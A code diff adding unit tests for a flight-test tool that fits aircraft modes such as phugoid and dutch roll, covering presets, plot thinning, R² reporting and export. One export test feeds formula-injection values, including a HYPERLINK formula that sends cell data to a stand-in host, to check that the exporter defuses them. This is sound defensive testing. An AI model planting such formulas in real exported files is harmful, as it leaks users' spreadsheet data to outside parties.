@@ -4,6 +4,7 @@ import { fileChannel, makeDataset } from '../../core/export/testFixtures'
 import type { TestPoint } from '../../core/types'
 import {
   MODE_PRESETS,
+  PLOT_MAX_POINTS,
   channelFamily,
   crossesSegment,
   eigenvalueText,
@@ -11,10 +12,14 @@ import {
   fitCsv,
   fittedCurve,
   interpretFit,
+  modesForPoint,
   oscillationEnvelope,
   peakRows,
   plainNumber,
+  plotIndices,
+  presetActive,
   presetChannel,
+  presetForPoint,
   presetPoint,
   resolveModeRows,
   resultTiles,
@@ -22,6 +27,7 @@ import {
   runModeFit,
   sourceKind,
   sourcePointId,
+  thinPlotInput,
   windowSeries,
   type ModeFit,
 } from './modesModel'
@@ -266,6 +272,38 @@ describe('quick picks', () => {
     expect(presetPoint(points, byId('dutch-roll'), 'selection')).toBeNull()
     expect(presetPoint(points, byId('spiral'), 'point:a')).toBeNull()
   })
+
+  it('finds the quick pick a test point is named after', () => {
+    expect(presetForPoint('Short period')?.id).toBe('short-period')
+    expect(presetForPoint('Short-period doublet 2')?.id).toBe('short-period')
+    expect(presetForPoint('DUTCH ROLL (rudder)')?.id).toBe('dutch-roll')
+    expect(presetForPoint('roll subsidence')?.id).toBe('roll-subsidence')
+    expect(presetForPoint('Trim 210 KIAS')).toBeNull()
+  })
+
+  it('applies that quick pick’s channel and model with the window, in one update', () => {
+    expect(modesForPoint(ds, point('s', 'Short period', 0, 1))).toEqual({
+      source: 'point:s',
+      channelId: '____Q,deg/s',
+      model: 'oscillation',
+    })
+    // A trim point keeps the channel; a mode whose channels the log lacks only moves the window.
+    expect(modesForPoint(ds, point('t', 'Trim 210 KIAS', 0, 1))).toEqual({ source: 'point:t' })
+    expect(modesForPoint(ds, point('d', 'Dutch roll', 0, 1))).toEqual({ source: 'point:d' })
+  })
+
+  it('shows a quick pick as on only when it matches the channel, the model and a mode-named window', () => {
+    const points = [point('p', 'Phugoid', 0, 1), point('s', 'Short period', 1, 2), point('t', 'Trim 210 KIAS', 2, 3)]
+    const phugoid = byId('phugoid')
+    const onKias = { channelId: '_Vind,_kias', model: 'oscillation' as const }
+    expect(presetActive(ds, phugoid, { ...onKias, source: 'selection' }, points)).toBe(true)
+    expect(presetActive(ds, phugoid, { ...onKias, source: 'point:p' }, points)).toBe(true)
+    expect(presetActive(ds, phugoid, { ...onKias, source: 'point:t' }, points)).toBe(true)
+    // The Short period window analysed on the phugoid's airspeed: the Phugoid pick stays off.
+    expect(presetActive(ds, phugoid, { ...onKias, source: 'point:s' }, points)).toBe(false)
+    expect(presetActive(ds, phugoid, { ...onKias, model: 'first-order', source: 'selection' }, points)).toBe(false)
+    expect(presetActive(ds, byId('dutch-roll'), { channelId: null, model: 'oscillation', source: 'selection' }, points)).toBe(false)
+  })
 })
 
 describe('peak rows and figure subtitle', () => {
@@ -295,6 +333,112 @@ describe('peak rows and figure subtitle', () => {
   })
 })
 
+describe('drawing a long window', () => {
+  const n = 200_000
+  const t = Float64Array.from({ length: n }, (_, i) => i / 50)
+  // A slow oscillation with fast "noise", one spike and a run of missing samples.
+  const y = Float64Array.from({ length: n }, (_, i) => Math.sin(t[i] / 60) + 0.1 * Math.sin(i * 1.3))
+  y[123_457] = 9
+  for (let i = 150_000; i < 150_500; i += 1) y[i] = Number.NaN
+
+  it('draws every sample of an ordinary window', () => {
+    expect(plotIndices(y.subarray(0, 4096))).toBeNull()
+    const input = { t, y, fitted: null, fitOk: false, envelope: null, peaks: [], firstOrder: null, name: 'x', yTitle: 'x', t0Elapsed: 0 }
+    const short = { ...input, t: t.subarray(0, 100), y: y.subarray(0, 100) }
+    expect(thinPlotInput(short)).toBe(short)
+  })
+
+  it('keeps the extremes, the gaps and both ends of a long one, in time order, within the budget', () => {
+    const keep = plotIndices(y)!
+    expect(keep.length).toBeLessThanOrEqual(PLOT_MAX_POINTS)
+    expect(keep.length).toBeGreaterThan(PLOT_MAX_POINTS / 2)
+    expect(keep[0]).toBe(0)
+    expect(keep[keep.length - 1]).toBe(n - 1)
+    for (let k = 1; k < keep.length; k += 1) expect(keep[k]).toBeGreaterThan(keep[k - 1])
+    expect(Array.from(keep)).toContain(123_457)
+    expect(Array.from(keep).some((i) => Number.isNaN(y[i]))).toBe(true)
+  })
+
+  it('thins every line of the chart input alike', () => {
+    const fitted = Float64Array.from(t, (x) => Math.sin(x / 60))
+    const envelope = { upper: fitted.map((v) => v + 1), lower: fitted.map((v) => v - 1) }
+    const input = { t, y, fitted, fitOk: true, envelope, peaks: [], firstOrder: null, name: 'x', yTitle: 'x', t0Elapsed: 5 }
+    const thin = thinPlotInput(input)
+    const keep = plotIndices(y)!
+    expect(thin.t.length).toBe(keep.length)
+    for (const line of [thin.y, thin.fitted!, thin.envelope!.upper, thin.envelope!.lower]) expect(line.length).toBe(keep.length)
+    expect(thin.t[10]).toBe(t[keep[10]])
+    expect(thin.envelope!.upper[10]).toBe(envelope.upper[keep[10]])
+    expect(thin.t0Elapsed).toBe(5)
+  })
+})
+
+describe('one R² and no mode named from a doubtful fit', () => {
+  // A 20 s oscillation (amplitude 2) riding a climb of 1 unit/s, with a deterministic wobble the model cannot follow.
+  const { t, y: wave } = damped(20, 0.08, 80, 10, 0, 2)
+  const y = wave.map((v, i) => v + t[i] + 0.8 * Math.sin(i * 1.7) + 0.5 * Math.cos(i * 2.9))
+
+  it('judges an oscillation on a trend by the share of what the trend leaves', () => {
+    const result = runModeFit({ t, y }, 'oscillation', 'linear')
+    if (result.model !== 'oscillation') throw new Error('wrong model')
+    expect(result.fit.ok).toBe(true)
+    // The climb alone makes the overall R² look better than the oscillation fit is.
+    expect(result.r2Oscillation).toBeLessThan(result.fit.r2 - 0.05)
+    expect(result.r2Oscillation).toBeGreaterThan(0)
+    const tile = resultTiles(result, 'ft').find((x) => x.key === 'r2')
+    expect(tile?.label).toBe('R² (trend removed)')
+    expect(Number(tile?.value)).toBeCloseTo(result.r2Oscillation, 3)
+    expect(tile?.foot).toMatch(/^With the trend 0\.\d+/)
+    expect(figureSubtitle(result)).toMatch(/R² \(trend removed\) = /)
+    const tsv = resultsTsv(result, { dataset: 'd', channel: 'c', window: 'w', rows: [0, t.length], t0: 0, durationS: 80, detrend: 'linear' })
+    expect(tsv).toMatch(/^R2 \(trend removed\)\t0\.\d+\t$/m)
+    expect(tsv).toMatch(/^R2 \(with trend\)\t0\.\d+\t$/m)
+  })
+
+  it('is the plain R² when only a constant is removed', () => {
+    const result = runModeFit(damped(20, 0.1, 60, 10, -5, 3), 'oscillation', 'none')
+    if (result.model !== 'oscillation') throw new Error('wrong model')
+    expect(result.r2Oscillation).toBeCloseTo(result.fit.r2, 9)
+    expect(resultTiles(result, 'deg').find((x) => x.key === 'r2')?.label).toBe('R²')
+  })
+
+  it('reads a well-damped short period that dies out within two cycles as the whole response', () => {
+    // ζ = 0.5 over 5.9 s: 1.7 cycles, by when the oscillation has decayed to almost nothing.
+    const sp = damped(3.4, 0.5, 5.9, 20, 2, 1)
+    const reading = interpretFit(runModeFit(sp, 'oscillation', 'none'), { token: 'alpha,__deg' })
+    expect(reading?.tone).toBe('good')
+    expect(reading?.text).toMatch(/typical of a short period/)
+    expect(resultTiles(runModeFit(sp, 'oscillation', 'none'), 'deg').find((t) => t.key === 'cycles')?.foot).toBe(
+      'It has died out by the end',
+    )
+  })
+
+  it('names no mode and shows no green from a window with fewer than two cycles', () => {
+    // 1.2 cycles of a clean phugoid on airspeed: the fit is fine, the window too short to call it a phugoid.
+    const short = damped(58, 0.06, 70)
+    const reading = interpretFit(runModeFit(short, 'oscillation', 'none'), { token: 'Vtrue,_ktas' })
+    expect(reading?.tone).toBe('neutral')
+    expect(reading?.text).not.toMatch(/typical/)
+    expect(reading?.text).toMatch(/only 1\.\d+ cycles.*— check the window\.$/)
+  })
+
+  it('names no mode when the log decrement disagrees with the fit, or the fit carries a note', () => {
+    const sound = runModeFit(damped(58, 0.06, 180), 'oscillation', 'linear')
+    if (sound.model !== 'oscillation') throw new Error('wrong model')
+    const ktas = { token: 'Vtrue,_ktas' }
+    expect(interpretFit(sound, ktas)?.tone).toBe('good')
+    const disagrees: ModeFit = { ...sound, fit: { ...sound.fit, zetaLogDec: 0.2 } }
+    expect(interpretFit(disagrees, ktas)).toMatchObject({ tone: 'neutral' })
+    expect(interpretFit(disagrees, ktas)?.text).toMatch(/log decrement gives ζ = 0\.2.*check the window/)
+    const noted: ModeFit = { ...sound, fit: { ...sound.fit, message: 'Fair fit: the oscillation explains 71% of the variation.' } }
+    expect(interpretFit(noted, ktas)?.text).toMatch(/\(see the note\) — check the window\.$/)
+    // A growing oscillation from a doubtful fit is not declared unstable either.
+    const growing: ModeFit = { ...sound, fit: { ...sound.fit, sigma: -0.01, halfLifeS: -69, cycles: 1.4 } }
+    expect(interpretFit(growing, ktas)).toMatchObject({ tone: 'neutral' })
+    expect(interpretFit(growing, ktas)?.text).toMatch(/grows \(only 1\.4 cycles\) — check the window/)
+  })
+})
+
 describe('copy and CSV text', () => {
   const { t, y } = damped(20, 0.1, 60, 10, -5, 3)
   const result = runModeFit({ t, y }, 'oscillation', 'none')
@@ -311,6 +455,21 @@ describe('copy and CSV text', () => {
   it('writes plain numbers', () => {
     expect(plainNumber(-0.000123456789)).toBe('-0.0001234568')
     expect(plainNumber(Number.NaN)).toBe('')
+  })
+
+  it('defuses text a spreadsheet would run as a formula (names come from the file)', () => {
+    const text = resultsTsv(result, {
+      ...ctx,
+      dataset: '@SUM(A1)',
+      channel: '=HYPERLINK("http://example.invalid/?x="&A3, "click")',
+      window: '=1+2',
+    })
+    expect(text).toMatch(/^dataset\t'@SUM\(A1\)\t$/m)
+    expect(text).toMatch(/^channel\t'=HYPERLINK\(/m)
+    expect(text).toMatch(/^window\t'=1\+2\t$/m)
+    expect(text).not.toMatch(/\t[=@+]/)
+    // Ordinary names are left alone.
+    expect(resultsTsv(result, ctx)).toMatch(/^channel\tPitch \[deg\]\t$/m)
   })
 
   it('writes the window as CSV with the fit and residual', () => {
